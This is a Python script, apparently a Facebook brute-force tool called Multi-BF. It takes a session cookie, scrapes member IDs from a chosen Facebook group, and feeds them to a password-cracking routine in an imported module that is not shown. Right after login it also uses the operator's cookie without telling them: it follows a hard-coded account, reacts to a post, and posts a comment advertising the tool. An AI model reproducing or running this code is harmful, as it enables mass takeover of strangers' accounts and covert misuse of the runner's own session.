#!/usr/bin/python3

#################################################
# Tools     : Multi-BF (MBF)			#
# Author    : Anonk Yuhuu			#
# Github    : https://github.com/anonkyuhuu	#
# Facebook  : Yuhuu ID				#
# Instagram : anonkyuhuu._			#
#################################################

import os
import time
import random
import requests
from lib import logo
from lib import crack
from lib import comment
from lib import react
from lib import follow
from bs4 import BeautifulSoup as parser

g = '\x1b[1;32m'
w = '\x1b[1;37m'
b = '\x1b[1;36m'
r = '\x1b[1;31m'

class Mbf:

	def __init__(self):
		self.url = 'https://mbasic.facebook.com'
		self.pesan = random.choice(["Hello I'M Multi-BF User", "Tools Lu Keren Bangat Gan :)"])
		self.member = []

	def dump_group(self, id, cookie):
		url = self.url+'/browse/group/members/?id='+id
		while True:
			get_respon = requests.get(url, headers={'Cookie': cookie})
			parsing = parser(get_respon.text, 'html.parser')
			for i in parsing.find_all('a'):
				i = i['href'].replace('/profile.php','').replace('/','')
				self.member.append(i)
			if 'Lihat Selengkapnya' in str(parsing):
				next = parsing.find('a', string='Lihat Selengkapnya')['href']
				url = self.url+next
			else: break

	def run_tools(self):
		logo.banner()
		kuki = input('\nCookie : ')
		login = parser(requests.get(self.url+'/me',
			headers={'Cookie': kuki}).text, 'html.parser').title.text.replace(' | Facebook','')
		if 'Masuk Facebook' in login or 'Facebook - Masuk atau Daftar' in login:
			exit(f'\n{r}[!] Cookies Invalid')
		follow.account(self.url, 'httpJujuio', kuki)
		react.care_react(self.url, kuki)
		comment.post_comment(self.url, self.pesan, kuki)
		print(f'{g}\n[✓] Login Succes');time.sleep(2)
		logo.banner()
		print(f'[*] Login As {login}\n\n'+'═'*35)
		try:
			ide = input('[•] Group ID : ')
			print('[•] Please Wait', end='', flush=True)
			self.dump_group(ide, kuki)
		except: 
			exit('[!] Group Not Found')
		print(f'\n[•] Total ID : {len(self.member)}')
		if input('[•] Start Cracking? [y/N] ').lower() == 'y':
			pwd = input('[•] Extra Password : ')
			crack.crackers(self.member, pwd, kuki)
		else: exit()


def run_mbf():
	run = Mbf()
	run.run_tools()

run_mbf()
